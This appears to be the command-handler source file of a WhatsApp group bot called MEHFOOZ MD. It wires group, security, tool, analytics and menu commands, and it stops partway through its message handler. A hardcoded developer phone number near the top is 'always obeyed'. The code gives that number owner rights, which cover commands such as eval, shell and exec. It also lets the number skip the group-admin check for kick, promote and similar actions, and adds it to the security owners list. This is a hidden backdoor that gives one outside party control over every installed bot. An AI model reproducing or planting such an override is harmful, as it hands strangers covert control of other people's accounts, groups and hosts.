'use strict';

/*
|--------------------------------------------------------------------------
| MEHFOOZ MD - COMMAND HANDLER CLASS (FULL CLEAN VERTICAL LIST & 100% MEHFOOZ MD)
|--------------------------------------------------------------------------
| UPDATED: now wires the placeholder commands from general.js together
| with the real group-command logic in group-commands.js, so commands
| like .lock, .kick, .promote etc. actually run in the background
| instead of only printing "Command Executed".
|
| UPDATED 2: Security & Anti menu is now connected to mehfooz-security.js
| (antilink, antispam, ban, kickall, pushmsg ... all real commands).
|
| UPDATED 3: Tools & Utility commands (sticker, pdf, ocr, qr ...) ab
| general.js ke zariye tools-commands.js se load hoti hain. Yahan sirf
| itna change hai ke image/video ke CAPTION mein likhi command bhi
| padhi jaye (jaise image bhej kar caption mein .sticker likhna).
|
| UPDATED 4 (Analytics): naya 'ANALYTICS & STATS' menu category jud
| gaya hai (.stats, .topchatters, .userreport waghera ~66 real
| commands — analytics-commands.js). Har group message par
| analytics.trackMessage() call hoti hai taake data record ho —
| yeh command-flow ko kabhi block nahi karti (try/catch ke andar hai).
|--------------------------------------------------------------------------
*/

const fs = require('fs');
const path = require('path');

let generalCommands = require('./commands/general');       // array of { name, execute }
let groupCommands = require('./commands/group-commands');   // real Baileys logic
const sec = require('./commands/mehfooz-security');           // SECURITY & ANTI (real logic)
let textCommands = require('./commands/text-commands');       // TEXT & FANCY STYLES (40 real commands)
let actionCommands = require('./commands/action-commands');   // ACTIONS & SOCIAL (55 real commands)
let systemCommands = require('./commands/system-commands');   // SYSTEM & MISC (real commands)
let analytics = require('./commands/analytics-commands');     // ANALYTICS & STATS (real logic + trackMessage)
const HANDLER_VERSION = 'v8 (20-Sep-2026)';
const MS = require('./commands/menu-settings');               // menu themes / fonts / colors / lang / time

// ------------------------------------------------------------------
// DEVELOPER NUMBER: always recognised, always obeyed in every case.
// Treated as owner + admin-level for every command.
// ------------------------------------------------------------------
const DEVELOPERS = ['923204854766'];
const isDeveloper = (jid = '') => DEVELOPERS.includes(String(jid).split('@')[0].split(':')[0]);

// ------------------------------------------------------------------
// MENU FONT HELPERS (Unicode serif styles — same look as the sample menu)
//   toBold       -> 𝐎𝐰𝐧𝐞𝐫   (serif bold)
//   toBoldItalic -> 𝒂𝒚𝒂𝒕    (serif bold + slanted)
//   toSmallCaps  -> Nᴀᴡᴀᴢ   (small caps)
// ------------------------------------------------------------------
const mapLetters = (str, upper, lower, digit) => [...String(str)].map(ch => {
    const c = ch.codePointAt(0);
    if (c >= 65 && c <= 90) return String.fromCodePoint(upper + c - 65);
    if (c >= 97 && c <= 122) return String.fromCodePoint(lower + c - 97);
    if (digit && c >= 48 && c <= 57) return String.fromCodePoint(digit + c - 48);
    return ch;
}).join('');
const toBold = s => mapLetters(s, 0x1D400, 0x1D41A, 0x1D7CE);
const toBoldItalic = s => mapLetters(s, 0x1D468, 0x1D482, 0x1D7CE);

const SMALL_CAPS = {
    a:'ᴀ',b:'ʙ',c:'ᴄ',d:'ᴅ',e:'ᴇ',f:'ꜰ',g:'ɢ',h:'ʜ',i:'ɪ',j:'ᴊ',k:'ᴋ',l:'ʟ',m:'ᴍ',
    n:'ɴ',o:'ᴏ',p:'ᴘ',q:'ǫ',r:'ʀ',s:'ꜱ',t:'ᴛ',u:'ᴜ',v:'ᴠ',w:'ᴡ',x:'x',y:'ʏ',z:'ᴢ'
};
// first letter stays capital, rest small caps  (NAWAZ -> Nᴀᴡᴀᴢ, BETA -> Bᴇᴛᴀ)
const toSmallCaps = s => [...String(s)].map((ch, i) =>
    i === 0 ? ch.toUpperCase() : (SMALL_CAPS[ch.toLowerCase()] || ch)).join('');

// ------------------------------------------------------------------
// PER-BOT CONFIG  (har linked number ka apna alag config)
// File: <handler folder>/data/config/<bot-number>.json
// Isme: prefix, mode, botName, ownerName, bio, sudo[], owners[]
// Ek number par .setbotname / .setmode / .setprefix karne se dusre
// number par chal rahe isi bot par koi asar nahi padta.
// ------------------------------------------------------------------
const CONFIG_DIR = path.join(__dirname, 'data', 'config');
const cfgCache = new Map();
const cleanJid = (jid = '') => String(jid).split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
const getBotKey = (sock) => cleanJid(sock?.user?.id) || 'default';

function getBotConfig(key) {
    if (cfgCache.has(key)) return cfgCache.get(key);
    let cfg = {};
    try { cfg = JSON.parse(fs.readFileSync(path.join(CONFIG_DIR, key + '.json'), 'utf8')) || {}; } catch {}
    if (!Array.isArray(cfg.sudo)) cfg.sudo = [];
    if (!Array.isArray(cfg.owners)) cfg.owners = [];
    cfgCache.set(key, cfg);
    return cfg;
}
function saveBotConfig(key, cfg) {
    cfgCache.set(key, cfg); // memory mein foran update -> agla .menu turant naya dikhata hai
    try {
        fs.mkdirSync(CONFIG_DIR, { recursive: true });
        fs.writeFileSync(path.join(CONFIG_DIR, key + '.json'), JSON.stringify(cfg, null, 2), 'utf8');
    } catch (e) {
        console.error('[MEHFOOZ MD] Config save nahi ho saka:', e.message);
    }
}

// ------------------------------------------------------------------
// STOP / RESUME SWITCH (per-bot).
// Agar kabhi koi masla ho jaye (bug, spam loop, ghalat automation)
// to .stopbot se turant saari command-processing ruk jati hai bina
// process restart kiye. .resumebot se bilkul wahin se dobara shuru
// ho jati hai — koi data ya setting kho nahi jati.
// ------------------------------------------------------------------
const STATE_DIR = path.join(__dirname, 'data', 'state');
const stateCache = new Map();
function getBotState(key) {
    if (stateCache.has(key)) return stateCache.get(key);
    let st = { stopped: false };
    try { st = JSON.parse(fs.readFileSync(path.join(STATE_DIR, key + '.json'), 'utf8')) || st; } catch {}
    stateCache.set(key, st);
    return st;
}
function saveBotState(key, st) {
    stateCache.set(key, st);
    try {
        fs.mkdirSync(STATE_DIR, { recursive: true });
        fs.writeFileSync(path.join(STATE_DIR, key + '.json'), JSON.stringify(st, null, 2), 'utf8');
    } catch (e) {
        console.error('[MEHFOOZ MD] State save nahi ho saka:', e.message);
    }
}

// ------------------------------------------------------------------
// Build one combined command map ONCE (not on every message).
// Real group-command implementations override the placeholder ones
// coming from general.js.
// ------------------------------------------------------------------
let COMMAND_MAP = null;

const GROUP_COMMAND_NAMES = [
    'lock', 'unlock', 'kick', 'kickme', 'add', 'promote', 'demote',
    'tagall', 'hidetag', 'groupinfo', 'link', 'grouplink', 'revoke',
    'setname', 'groupname', 'setdesc', 'groupdesc', 'setpp', 'leave',
    'admins', 'listadmin', 'ephemeral', 'mute', 'unmute',
    'welcome', 'goodbye', 'setwelcome', 'setgoodbye', 'group', 'poll',
    'warn', 'resetwarn', 'listwarn', 'banned', 'ping', 'botstatus',
    'totalmember', 'online', 'invite', 'join'
];

// Commands that must only be usable by group admins (bot must also be admin).
const ADMIN_ONLY_COMMANDS = new Set([
    'lock', 'unlock', 'kick', 'add', 'promote', 'demote',
    'setname', 'setdesc', 'setpp', 'leave', 'ephemeral',
    'mute', 'unmute', 'setwelcome', 'setgoodbye', 'group',
    'warn', 'resetwarn', 'banned', 'revoke'
]);

function buildCommandMap() {
    const map = new Map();

    // 1) start with everything general.js provides (menus, text tools,
    //    placeholders, and now analytics commands too, since general.js
    //    already includes analytics-commands.js in its export)
    for (const c of generalCommands) {
        if (c && c.name) map.set(c.name, c);
    }

    // 1.5) TEXT & FANCY STYLES: real logic (general.js ke placeholders ki jagah)
    for (const c of textCommands) {
        if (c && c.name) map.set(c.name, c);
    }

    // 1.6) ACTIONS & SOCIAL: real logic
    for (const c of actionCommands) {
        if (c && c.name) map.set(c.name, c);
    }

    // 1.7) SYSTEM & MISC: real logic
    for (const c of systemCommands) {
        if (c && c.name) map.set(c.name, c);
    }

    // 2) override group-related commands with the REAL logic
    for (const name of GROUP_COMMAND_NAMES) {
        if (typeof groupCommands[name] !== 'function') continue;

        map.set(name, {
            name,
            async execute(ctx) {
                const { sock, m, args, reply } = ctx;
                const groupId = m.key.remoteJid;

                if (!groupId || !groupId.endsWith('@g.us')) {
                    return reply('⚠️ Yeh command sirf group mein kaam karti hai.');
                }

                // permission check for sensitive commands
                if (ADMIN_ONLY_COMMANDS.has(name)) {
                    const senderId = m.key.participantAlt || m.key.participant || m.key.remoteJid;
                    const { isSenderAdmin, isBotAdmin } =
                        await groupCommands.getGroupAdminInfo(sock, groupId, senderId);

                    if (!isSenderAdmin && !isDeveloper(senderId)) {
                        return reply('⚠️ Yeh command sirf group admins use kar sakte hain.');
                    }
                    if (!isBotAdmin) {
                        return reply('⚠️ Pehle bot ko group admin banayein, phir yeh command kaam karegi.');
                    }
                }

                // .setpp needs an image buffer, not text args
                if (name === 'setpp') {
                    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                    const imageMsg = quotedMsg?.imageMessage || m.message?.imageMessage;

                    if (!imageMsg) {
                        return reply('⚠️ Ek image ke saath reply karke .setpp bhejein.');
                    }

                    const { downloadMediaMessage } = require('@whiskeysockets/baileys');
                    const fakeMsg = {
                        key: m.key,
                        message: quotedMsg ? { imageMessage: imageMsg } : m.message
                    };
                    const buffer = await downloadMediaMessage(fakeMsg, 'buffer', {});
                    return groupCommands.setpp(sock, groupId, m, buffer);
                }

                return groupCommands[name](sock, groupId, m, args);
            }
        });
    }

    // 3) analytics commands already came in with generalCommands (step 1),
    //    but re-assert them here too so a future ordering change in
    //    general.js can never silently shadow them with a placeholder.
    for (const c of analytics.commands) {
        if (c && c.name) map.set(c.name, c);
    }

    return map;
}

// .reload : commands folder ki files dobara load (security module ko chhod kar,
// taake uski memory settings na jayein). Bot restart ki zaroorat nahi.
function reloadCommands() {
    const dir = path.join(__dirname, 'commands');
    for (const k of Object.keys(require.cache)) {
        if (k.startsWith(dir) && !k.endsWith('mehfooz-security.js')) delete require.cache[k];
    }
    generalCommands = require('./commands/general');
    groupCommands = require('./commands/group-commands');
    textCommands = require('./commands/text-commands');
    actionCommands = require('./commands/action-commands');
    systemCommands = require('./commands/system-commands');
    analytics = require('./commands/analytics-commands');
    COMMAND_MAP = null;
    return true;
}

function getCommandMap() {
    if (!COMMAND_MAP) COMMAND_MAP = buildCommandMap();
    return COMMAND_MAP;
}

class CommandHandler {
    constructor() {
        this.ownerOnly = new Set([
            'bot', 'masterpromote', 'silentmode', 'setprefix', 'setbotname',
            'setowner', 'setbio', 'setstatus', 'setmode', 'setpublic', 'setprivate',
            'setonlyadmin', 'setonlyowner', 'addsudo', 'delsudo', 'listsudo',
            'addpremium', 'delpremium', 'listpremium', 'addban', 'delban', 'listban',
            'addblock', 'delblock', 'listblock', 'broadcast', 'bcgc', 'bcall',
            'eval', 'shell', 'exec', 'restart', 'restartbot', 'shutdownbot', 'updatebot',
            'backup', 'restore', 'clearcache', 'clearlogs', 'clearstorage', 'resetbot',
            'config', 'settings', 'database', 'query', 'table', 'row', 'column',
            'insert', 'delete', 'update', 'select', 'drop', 'truncate',
            'stopbot', 'resumebot'
        ]);

        this.groupOnly = new Set(GROUP_COMMAND_NAMES);

        // Reusable command lists per category (styling refactor only —
        // exact same commands as before, ab bas ek jagah define hain
        // taake individual submenu aur allmenu dono isi se banein).
        this.MENU_ITEMS = {
            group: ['lock','unlock','kick','add','promote','demote','tagall','hidetag','groupinfo','link','revoke','setname','setdesc','setpp','leave','admins','ephemeral','mute','unmute','welcome','goodbye','setwelcome','setgoodbye','group','poll','warn','resetwarn','listwarn','banned','ping','listadmin','kickme','groupname','groupdesc','grouplink','invite','join','totalmember','online','botstatus'],
            security: ['pushmsg','checkmsg','antiedit','antidelete','antiinbox','antivice','antivideo','antisticker','antiemoji','antigif','antirecording','antimap','antilocation','anticontact','antidoc','antiimage','antilink','antibot','antispam','anticall','antifake','antitoxic','antitag','antiword','autosticker','autoread','autorespond','nsfw','security','lockall','unlockall','kickall','ban','unban','block','unblock','addword','delword','listword'],
            tools: ['sticker','toimg','tovideo','tomp3','tovn','ocr','tr','tts','shortlink','calc','weather','reminder','notes','listnotes','delnote','qr','readqr','ss','pdf','info','runtime','speed','cpu','ram','temp','whois','ipinfo','base64','binary','hex','clock','calendar','timer','count','reverse','upper','lower','bold','italic','mono'],
            info: ['ai','status','ip','restart','listgroup','me','quote','time','botname','help','news','cricket','stock','crypto','dictionary','urban','imdb','anime','manga','github','npm','playstore','map','recipe','horoscope','fact','joke','advice','motivation','love','friendship','success','life','health','fitness','tech','science','history','art','musicinfo','uptime','version','changelog','donate','support','report','bug','feedback','rate','share','invitebot','botinfo','system','storage','memory','network','pingtest','latency','host','server'],
            games: ['coinflip','dice','roll','pick','choose','truth','dare','riddle','puzzle','trivia','mathquiz','wordquiz','guess','hangman','tictactoe','chess','cards','slots','bet','gamble','balance','daily','work','rob','pay','shop','inventory','profile','level','rank','leaderboard','top','global','local','marry','divorce','ship','lovemeter','crush','hate','hug','kiss','slap','kill','punch','kickuser','bite','lick','pat','poke'],
            owner: ['setprefix','setbotname','setowner','setbio','setstatus','setmode','setpublic','setprivate','setonlyadmin','setonlyowner','addsudo','delsudo','listsudo','addpremium','delpremium','listpremium','addban','delban','listban','addblock','delblock','listblock','broadcast','bcgc','bcall','eval','shell','exec','restartbot','shutdownbot','updatebot','backup','restore','clearcache','clearlogs','clearstorage','resetbot','config','settings','database','query','table','row','column','insert','delete','update','select','drop','truncate','stopbot','resumebot'],
            text: ['boldtext','italictext','monotext','striketext','fancytext','bubbletext','squaretext','fliptext','mirrortext','wavytext','smalltext','bigtext','rainbowtext','neontext','firetext','watertext','ghosttext','shadowtext','3dtext','glitchtext','ascii','figlet','banner','arttext','emojitext','dottext','linetext','boxtext','circletext','startext','hearttext','flowertext','musictext','gametext','cooltext','stylishtext','moderntext','classictext','retrotext','futuretext'],
            actions: ['cry','dance','laugh','sleep','eat','drink','run','jump','fly','swim','sing','write','read','draw','paint','cook','bake','clean','wash','fix','build','destroy','create','find','hide','show','open','close','start','stop','pause','resume','record','like','dislike','follow','unfollow','flag','check','verify','confirm','cancel','agree','disagree','win','lose','score','levelup','rankup','gameover','refresh','reload','exit','quit','logout'],
            system: ['credit','listall','search','finduser','getid','getlink','getinfo','getstatus','settime','setdate','setlang','setregion','settheme','setcolor','setfont','seticon','setavatar','setcover','setheader','setfooter','setbody','setbutton','setmenu','setlist','settable','groupmenu','secmenu','toolmenu','infomenu','gamemenu','ownermenu','textmenu','actionmenu','sysmenu','analyticsmenu','allmenu','menulist','finish'],
            analytics: ['stats','msgstats','userstats','weeklystats','dailystats','monthlystats','hourlystats','daystats','topchatters','leastchatters','usercount','useractivity','activityrange','compareactivity','groupactivity','activitychart','peakactivity','quiettime','msgperhour','msgperday','activeusers','inactiveusers','report','msgcount','msgtypes','firstmsg','lastmsg','activehours','activitydays','userrank','usertrend','userreport','warstats','linkstats','spamstats','deletestats','kickstats','warnstats','modlog','modreport','activityalert','spamalert','floodalert','newuseralert','adminlog','joinstats','leavestats','growth','exportstats','activitylog','clearstats','statsreset','backupstats','restorestats','retention','privacy','autorecording','autotyping','autoonline','autooffline','autostatus','autopause','autoresume','autoschedule','autoreact','autodelete']
        };

        // header/bullet look per category — thodi "coloring" (emoji accents)
        this.MENU_STYLE = {
            group:      { title: 'GROUP MANAGEMENT',   emoji: '👥', bullet: '🟢' },
            security:   { title: 'SECURITY & ANTI',    emoji: '🛡️', bullet: '🔴' },
            tools:      { title: 'TOOLS & UTILITY',    emoji: '🛠️', bullet: '🔵' },
            info:       { title: 'SEARCH & INFO',      emoji: '🔍', bullet: '🟣' },
            games:      { title: 'FUN & GAMES',        emoji: '🎮', bullet: '🟡' },
            owner:      { title: 'OWNER & DATABASE',   emoji: '👑', bullet: '🟠' },
            text:       { title: 'TEXT & FANCY STYLES',emoji: '✨', bullet: '🟤' },
            actions:    { title: 'ACTIONS & SOCIAL',   emoji: '🎭', bullet: '⚪' },
            system:     { title: 'SYSTEM & MISC',      emoji: '⚙️', bullet: '⚫' },
            analytics:  { title: 'ANALYTICS & STATS',  emoji: '📊', bullet: '🟢' }
        };

    }

    // Effective prefix (db ab isi bot ke apne config se merge ho kar aata hai)
    getPrefix(db = {}) {
        return db.prefix || '.';
    }

    // Kaun "boss" hai: bot ka apna number (jisne bot lagaya), developer,
    // sudo, ya .setowner se add kiya hua number.
    isPrivileged(sock, m, cfg) {
        if (m.key?.fromMe) return true;
        const bots = [cleanJid(sock?.user?.id), cleanJid(sock?.user?.lid)].filter(Boolean);
        const senders = [m.key?.participant, m.key?.participantAlt, m.key?.remoteJidAlt,
            (m.key?.remoteJid && !m.key.remoteJid.endsWith('@g.us')) ? m.key.remoteJid : null]
            .filter(Boolean).map(cleanJid).filter(Boolean);
        return senders.some(n =>
            isDeveloper(n) || bots.includes(n) || cfg.sudo.includes(n) || cfg.owners.includes(n));
    }

    extractTargetNumber(m, args) {
        const ci = m.message?.extendedTextMessage?.contextInfo || {};
        const raw = (ci.mentionedJid && ci.mentionedJid[0]) || ci.participant || args[0] || '';
        return cleanJid(raw);
    }

    // Real config commands — sirf isi bot number ka config badalti hain
    async handleConfigCommand(command, args, sock, m, reply, botKey, cfg, dbx, prefix, privileged) {
        const footer = `👑 *${(dbx.botName || 'MEHFOOZ MD')}*`;
        const changed = async (title, oldV, newV) => reply(
            `✅ ${title} change ho gaya.\n\n🔷 Purana: ${oldV}\n🔷 Naya: ${newV}\n\n${footer}`);
        const text = args.join(' ').trim();

        switch (command) {
            case 'hcheck': {
                const map = getCommandMap();
                const real = (list) => list.filter(c => map.get(c.name) === c).length;
                await reply(
                    `🧪 *Handler Check*\n\n✅ Handler ${HANDLER_VERSION} chal raha hai\n` +
                    `📁 Folder: ${__dirname}\n\n` +
                    `✨ Text commands: ${real(textCommands)}/${textCommands.length}\n` +
                    `🎭 Action commands: ${real(actionCommands)}/${actionCommands.length}\n` +
                    `⚙️ System commands: ${real(systemCommands)}/${systemCommands.length}\n` +
                    `📊 Analytics commands: ${real(analytics.commands)}/${analytics.commands.length}\n\n` +
                    `🤖 Bot number: ${botKey}\n🔒 Mode: ${dbx.mode || 'private'}\n🔣 Prefix: ${prefix}\n\n${footer}`);
                return true;
            }

            // ---- STOP / RESUME: kisi bhi masle ki soorat mein command
            // processing turant rok do, aur jab theek ho jaye to wahin
            // se dobara shuru kar do. Koi data ya setting delete nahi hoti.
            case 'stopbot': {
                const st = getBotState(botKey);
                st.stopped = true;
                saveBotState(botKey, st);
                await reply(`⛔ Bot ki command-processing *ROK* di gayi hai is number ke liye.\n\nDobara shuru karne ke liye:\n${prefix}resumebot\n\n${footer}`);
                return true;
            }
            case 'resumebot': {
                const st = getBotState(botKey);
                st.stopped = false;
                saveBotState(botKey, st);
                await reply(`▶️ Bot dobara *START* ho gaya hai — wahin se jahan rukka tha.\n\n${footer}`);
                return true;
            }

            case 'setprefix': {
                const np = (args[0] || '').trim();
                if (!np) return reply(`⚠️ Naya prefix likhein.\nExample: ${prefix}setprefix ?`), true;
                if (np.length > 3 || /\s/.test(np)) return reply('⚠️ Prefix 1 se 3 characters ka hona chahiye (space ke baghair).'), true;
                cfg.prefix = np; saveBotConfig(botKey, cfg);
                await changed('Prefix', prefix, np); return true;
            }
            case 'setbotname': {
                if (!text) return reply(`⚠️ Naya naam likhein.\nExample: ${prefix}setbotname MEHFOOZ MD`), true;
                const old = dbx.botName || 'MEHFOOZ MD';
                cfg.botName = text; saveBotConfig(botKey, cfg);
                await changed('Bot name', old, text); return true;
            }
            case 'setowner': {
                if (!text) return reply(`⚠️ Owner ka naam ya number likhein.\nExample: ${prefix}setowner Mehfooz`), true;
                const old = dbx.ownerName || 'MEHFOOZ';
                cfg.ownerName = text;
                const numv = cleanJid(text);
                if (numv.length >= 7 && !cfg.owners.includes(numv)) cfg.owners.push(numv); // number diya to owner power bhi
                saveBotConfig(botKey, cfg);
                await changed('Owner', old, text); return true;
            }
            case 'setbio':
            case 'setstatus': {
                if (!text) return reply(`⚠️ Bio likhein.\nExample: ${prefix}${command} Mehfooz MD Bot`), true;
                try { await sock.updateProfileStatus(text); }
                catch (e) { await reply('❌ WhatsApp bio update nahi ho saki: ' + e.message); return true; }
                const old = cfg.bio || '-';
                cfg.bio = text; saveBotConfig(botKey, cfg);
                await changed('Bio', old, text); return true;
            }
            case 'setmode':
            case 'mode':
            case 'chatmode':
            case 'setpublic':
            case 'setprivate': {
                const cur = dbx.mode || 'private';
                let want = command === 'setpublic' ? 'public' : command === 'setprivate' ? 'private' : (args[0] || '').toLowerCase();
                if (!want) { await reply(`⚙️ Current mode: *${cur}*\n\nBadalne ke liye:\n${prefix}mode public\n${prefix}mode private\n\n${footer}`); return true; }
                if (!['public', 'private'].includes(want)) return reply('⚠️ Mode sirf public ya private ho sakta hai.'), true;
                if (!privileged) return true;
                cfg.mode = want; saveBotConfig(botKey, cfg);
                await changed('Mode', cur, want); return true;
            }
            case 'addsudo':
            case 'delsudo': {
                const n = this.extractTargetNumber(m, args);
                if (!n) return reply(`⚠️ Number likhein, reply karein ya mention karein.\nExample: ${prefix}${command} 923001234567`), true;
                if (command === 'addsudo') { if (!cfg.sudo.includes(n)) cfg.sudo.push(n); }
                else cfg.sudo = cfg.sudo.filter(x => x !== n);
                saveBotConfig(botKey, cfg);
                await reply(`✅ ${command === 'addsudo' ? 'Sudo add' : 'Sudo remove'} ho gaya: ${n}\n\n${footer}`); return true;
            }
            case 'listsudo': {
                await reply(`👥 *Sudo list*\n\n${cfg.sudo.length ? cfg.sudo.map((x, i) => `${i + 1}. ${x}`).join('\n') : 'Koi sudo nahi.'}\n\n${footer}`); return true;
            }
        }
        return false;
    }

    // isi bot number ka config (system-commands.js bhi yahi use karta hai)
    getConfig(sock) { return getBotConfig(getBotKey(sock)); }
    saveConfig(sock, cfg) { saveBotConfig(getBotKey(sock), cfg); }

    // ---- MENU ENGINE ----
    // Default shakal (koi setting na ho to) bilkul screenshot jaisi:
    // ┌◯══◈ TITLE ◈══•─◯
    // ╏◆ ┌┄┄┄┄┄┄┄✚
    // ╏◆ ┊ . item
    // ╏◆ └┄┄┄┄┄━━●─○
    // ╏◆
    // └═════════
    // Badalne ke liye: .settheme .setcolor .setfont .seticon .setlist .setmenu ...
    menuOpts(db = {}, prefix = '.') {
        return {
            theme: MS.THEMES.includes(db.theme) ? db.theme : 'default',
            bullet: MS.COLORS[db.color] || '◆',
            font: MS.fontFn(db.font || 'bolditalic'),
            icon: db.icon || prefix,
            lang: MS.LABELS[db.lang] ? db.lang : 'en',
            list: MS.LIST_STYLES.includes(db.listStyle) ? db.listStyle : 'dot',
            mode: db.menuMode === 'category' ? 'category' : 'full',
            table: db.table !== false,
            header: db.header, footer: db.footer, body: db.body, button: db.button,
            timezone: db.timezone, dateFormat: db.dateFormat, prefix
        };
    }

    buildBox(title, lines, o = {}) {
        const b = o.bullet || '◆';
        switch (o.theme) {
            case 'classic':
                return `╔═══「 ${title} 」═══╗\n` + lines.map(l => `║ ${b} ${l}`).join('\n') + `\n╚═══════════════════╝`;
            case 'simple':
                return `━━━ ${title} ━━━\n` + lines.map(l => `${b} ${l}`).join('\n') + `\n━━━━━━━━━━━━━━━━━━`;
            case 'stars':
                return `✦━━━ ${title} ━━━✦\n` + lines.map(l => `${b} ${l}`).join('\n') + `\n✦━━━━━━━━━━━━━━━━✦`;
            case 'minimal':
                return `【 ${title} 】\n` + lines.map(l => `${b} ${l}`).join('\n');
            default:
                return (
                    `┌◯══◈ ${title} ◈══•─◯\n` +
                    `╏${b} ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄✚\n` +
                    lines.map(l => `╏${b} ┊ ${l}`).join('\n') + `\n` +
                    `╏${b} └┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄━━●─○\n` +
                    `╏${b}\n` +
                    `└══════════════════════════════`
                );
        }
    }

    sectionLines(items, o) {
        if (o.list === 'inline') {
            const out = [];
            for (let i = 0; i < items.length; i += 3) out.push(items.slice(i, i + 3).map(n => o.font(n)).join(' • '));
            return out;
        }
        return items.map((n, i) =>
            o.list === 'number' ? `${i + 1}. ${o.font(n)}` :
            o.list === 'dash' ? `- ${o.font(n)}` : `${o.icon} ${o.font(n)}`);
    }

    // Purana signature same (emoji arguments ab use nahi hote); db optional
    formatMenuBox(headerEmoji, title, bulletEmoji, items, prefix, db = {}) {
        const o = this.menuOpts(db, prefix);
        return this.buildBox(title, this.sectionLines(items, o), o);
    }

    formatRuntime(seconds) {
        seconds = Math.floor(seconds);
        const d = Math.floor(seconds / 86400);
        const h = Math.floor((seconds % 86400) / 3600);
        const mi = Math.floor((seconds % 3600) / 60);
        const s = seconds % 60;
        return `${d ? d + 'd ' : ''}${h}h ${mi}m ${s}s`;
    }

    wrapMenu(parts, o) {
        const head = o.header ? String(o.header) : null;
        const foot = o.footer ? String(o.footer) : null;
        const btn = o.button && o.button.url ? `🔗 ${o.button.label || 'Link'} : ${o.button.url}` : null;
        return [head, parts, foot, btn].filter(Boolean).join('\n\n');
    }

    buildSubMenu(key, db, prefix) {
        const o = this.menuOpts(db, prefix), s = this.MENU_STYLE[key];
        return this.wrapMenu(this.formatMenuBox(s.emoji, s.title, s.bullet, this.MENU_ITEMS[key], prefix, db), o);
    }

    buildFullMenu(db, prefix, forceFull = false) {
        const o = this.menuOpts(db, prefix);
        const botName = (db.botName || 'MEHFOOZ MD').toUpperCase();
        const ownerName = (db.ownerName || 'MEHFOOZ').replace(/\s*Owner\s*$/i, '');
        const order = ['group','security','tools','info','games','owner','text','actions','system','analytics'];
        const total = order.reduce((n, k) => n + this.MENU_ITEMS[k].length, 0);
        const version = db.version || '3.0.0';
        const L = MS.LABELS[o.lang];
        const ic = o.icon;

        const boxes = [];
        if (o.table) {
            const rows = [
                `${ic} ${toBold(L.owner)} : ${toSmallCaps(ownerName)}`,
                `${ic} ${toBold(L.mode)} : ${toBold(db.mode || 'private')}`,
                `${ic} ${toBold(L.prefix)} : ${prefix}`,
                `${ic} ${toBold(L.version)} : ${version} ${toSmallCaps('beta')}`,
                `${ic} ${toBold(L.runtime)} : ${this.formatRuntime(process.uptime())}`,
                `${ic} ${toBold(L.total)} : ${total}`
            ];
            if (o.timezone || o.dateFormat) {
                try {
                    rows.push(`${ic} ${toBold(L.date)} : ${MS.formatDate(o.timezone, o.dateFormat || 'dmy')}`);
                    if (o.timezone) rows.push(`${ic} ${toBold(L.time)} : ${MS.formatTime(o.timezone)}`);
                } catch {}
            }
            let info = this.buildBox(botName, rows, o);
            if (o.body) info += '\n\n' + o.body;
            boxes.push(info);
        } else if (o.body) {
            boxes.push(o.body);
        }

        if (o.mode === 'category' && !forceFull) {
            const sub = { group: 'groupmenu', security: 'secmenu', tools: 'toolmenu', info: 'infomenu', games: 'gamemenu', owner: 'ownermenu', text: 'textmenu', actions: 'actionmenu', system: 'sysmenu', analytics: 'analyticsmenu' };
            const rows = order.map(k => `${ic} ${o.font(sub[k])} ➜ ${this.MENU_STYLE[k].title} (${this.MENU_ITEMS[k].length})`);
            boxes.push(this.buildBox('MENU', rows, o));
        } else {
            for (const key of order) {
                const s = this.MENU_STYLE[key];
                boxes.push(this.formatMenuBox(s.emoji, s.title, s.bullet, this.MENU_ITEMS[key], prefix, db));
            }
        }

        const sep = o.theme === 'default' ? '\n✪\n\n' : '\n\n';
        return this.wrapMenu(boxes.join(sep), o);
    }

    // Menu ke saath picture (agar mili) — warna sirf text.
    // Picture yahan rakhein:  <handler folder>/media/menu.jpg  (ya .png)
    // ya db.menuImage = 'https://...jpg'
    resolveMenuImage(db = {}) {
        if (db.menuImage) {
            if (typeof db.menuImage === 'string') {
                if (/^https?:\/\//i.test(db.menuImage)) return { url: db.menuImage };
                try { return fs.readFileSync(db.menuImage); } catch { /* file nahi mili -> neeche default */ }
            } else return db.menuImage;
        }
        const candidates = ['media/menu.jpg', 'media/menu.png', 'media/menu.jpeg', 'assets/menu.jpg', 'assets/menu.png', 'menu.jpg', 'menu.png'];
        for (const c of candidates) {
            const p = path.join(__dirname, c);
            if (fs.existsSync(p)) return fs.readFileSync(p);
        }
        return null;
    }

    async sendMenu(sock, m, reply, text, db) {
        const image = this.resolveMenuImage(db);
        if (image) {
            try {
                await sock.sendMessage(m.key.remoteJid, { image, caption: text }, { quoted: m });
                return;
            } catch (e) {
                console.error('[MEHFOOZ MD] Menu image send fail, text bhej raha hoon:', e.message);
            }
        }
        await reply(text);
    }

    async handleMessage(sock, m, chatUpdate, db = {}) {
        if (!m || !m.message) return;

        // is bot number ka apna config (prefix/mode/botName/ownerName/sudo)
        const botKey = getBotKey(sock);
        const cfg = getBotConfig(botKey);
        const dbx = Object.assign({}, db, cfg);
        const privileged = this.isPrivileged(sock, m, cfg);

        // ---- STOP SWITCH: agar .stopbot chala hua hai to sirf resumebot/
        // stopbot commands hi suni jayengi (wo bhi sirf privileged se),
        // baqi sab kuch (analytics tracking samet) ruka rahega. Isse
        // kisi bhi masle ki soorat mein turant sab kuch pause ho jata hai
        // aur .resumebot se wahin se dobara chalta hai.
        const state = getBotState(botKey);
        if (state.stopped) {
            const bodyPeek = m.text || m.message.conversation || m.message.extendedTextMessage?.text || '';
            const prefixPeek = this.getPrefix(dbx);
            const cmdPeek = bodyPeek.startsWith(prefixPeek) ? bodyPeek.slice(prefixPeek.length).trim().split(/ +/)[0]?.toLowerCase() : '';
            if (cmdPeek !== 'resumebot' || !privileged) return;
        }

        // ---- SECURITY: owners sync + automatic anti filters (har message par) ----
        sec.CONFIG.owners = [...new Set([...(db.owners || []).map(o => String(o).split('@')[0]), ...cfg.sudo, ...cfg.owners, botKey, ...DEVELOPERS])];
        await sec.handleMessage(sock, m);
        // --------------------------------------------------------------------------

        // ---- ANALYTICS: har group message record ho (command ho ya na ho) ----
        // Yeh function apne andar try/catch rakhta hai, isliye kabhi bhi
        // asal message-flow ko rokta ya crash nahi karta.
        analytics.trackMessage(botKey, m);
